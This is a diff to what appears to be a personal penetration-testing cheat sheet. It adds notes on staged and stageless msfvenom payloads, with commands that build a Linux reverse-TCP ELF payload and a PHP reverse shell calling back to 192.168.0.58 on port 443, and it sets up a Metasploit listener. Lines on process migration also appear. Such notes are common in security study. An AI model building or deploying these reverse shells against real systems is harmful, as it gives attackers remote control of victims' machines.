@@ -84,3 +84,22 @@ getpid > get the current shell pid
 ps -U SYSTEM
 migrate pid
 ```
+
+#### msfvenom Payload Types
+> Staged Payload : Not capable of creating a shell itself. Its just a downloader part and is smaller. Metasploit listner is required  that will send the missing payload and shell is obtained.
+
+```
+msfvenom -p linux/x64/shell/reverse_tcp lhost=192.168.0.58 lport=443 -f elf -o payload
+
+use exploit/multi/handler
+set lhost 0.0.0.0
+set lport 443
+run
+```
+
+> Stageless Payload : Doesnot requires additional and can be used to receive connection simply using netcat but is larger in size.
+
+```
+msfvenom -p php/reverse_php lhost=192.168.0.58 lport=443 -o phpshell.php
+
+```
